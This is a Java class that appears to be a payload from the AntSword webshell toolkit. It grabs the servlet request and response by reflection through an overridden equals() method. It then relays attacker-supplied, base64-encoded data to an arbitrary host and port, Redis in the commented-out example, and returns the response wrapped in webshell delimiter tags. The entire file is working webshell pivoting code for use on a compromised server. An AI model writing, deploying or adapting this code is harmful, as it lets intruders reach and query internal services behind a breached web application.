package other;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;

public class RedisConn {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder;
    public String cs;
    public String randomPrefix;

    @Override
    public boolean equals(Object obj) {
        try {
            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
        } catch (Exception e) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception ex) {
                    try {
                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                    } catch (Exception ignored) {

                    }
                }
            }
        }
        randomPrefix = "antswordrandomPrefix";
        encoder = "base64";
        cs = "antswordCharset";
        StringBuffer output = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargaddr";
        String varkey2 = "antswordargcontext";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = decode(request.getParameter(varkey1));
            String z2 = decode(request.getParameter(varkey2));
            output.append(SendData(z1, z2));
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }
        try {
            response.getWriter().print(tag_s + output.toString() + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    String decode(String str) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encoder.equals("hex")) {
            if (str == null || str.equals("")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString(cs);
        } else if (encoder.equals("base64")) {
            byte[] bt = null;
            try {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            } catch (ClassNotFoundException e) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            }
            return new String(bt, cs);
        }
        return str;
    }
    String Base64Encode(String str) {
        String version = System.getProperty("java.version");
        try {
            if (version.compareTo("1.9") >= 0) {
                Class Base64 = Class.forName("java.util.Base64");
                Object Encoder = Base64.getMethod("getEncoder", new Class[0]).invoke(Base64, new Object[]{});
                return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, str.getBytes());
            } else {
                Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = Base64.getDeclaredConstructor().newInstance();
                return (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, str.getBytes());
            }
        } catch (Exception e) {
            return "";
        }
    }
    String SendData(String addr, String context) throws Exception {
        Socket socket = null;
        try{
            socket = createSocket(addr);
        } catch (Exception e) {
            return Base64Encode("ERROR:// " + e.getMessage());
        }
        InputStream is = socket.getInputStream();
        OutputStream os = socket.getOutputStream();
        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os));
        bw.write(context);
        bw.flush();
//        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        byte[] buf = new byte[1024];
        int len = 0;
        String ret = "";
        try {
            while ((len = is.read(buf)) != -1) {
                ret += new String(buf, 0, len);
            }
//        String l = "";
//        try {
//            while ((l = br.readLine()) != null) {
//                ret += l + "\r\n";
//            }
        } catch(SocketTimeoutException ex) {
            if (ret.length() != 0) {
                return Base64Encode(ret);
            }
        } catch (Exception e) {
            throw e;
        } finally {
            if (socket != null) {
                socket.close();
            }
        }
        return Base64Encode(ret);
    }

    Socket createSocket(String addr) throws Exception {
        Socket socket = null;
        try {
            String [] inet = addr.split(":");
            socket = new Socket();
            socket.setReuseAddress(true);
            socket.setKeepAlive(false);
            socket.setTcpNoDelay(true);
            socket.setSoLinger(true, 0);
            socket.connect(new InetSocketAddress(inet[0], Integer.parseInt(inet[1])), 30);
            socket.setSoTimeout(30);
            return socket;
        } catch (Exception ex) {
            if(socket != null) {
                socket.close();
            }
            ex.printStackTrace();
            throw ex;
        }
    }
//    public static void main(String[] args) throws Exception {
//        RedisConn sd = new RedisConn();
//        sd.cs = "UTF-8";
//        sd.randomPrefix = "2";
//        sd.encoder = "base64";
//        String addr = sd.decode("kMMzAuMC4zMC4xMDo2Mzc5");
//        String context = sd.decode("3TKjINCiQ0DQpJTkZPDQokOA0KS2V5c3BhY2UNCg==");
//        System.out.println(sd.SendData(addr, context));
//    }
}
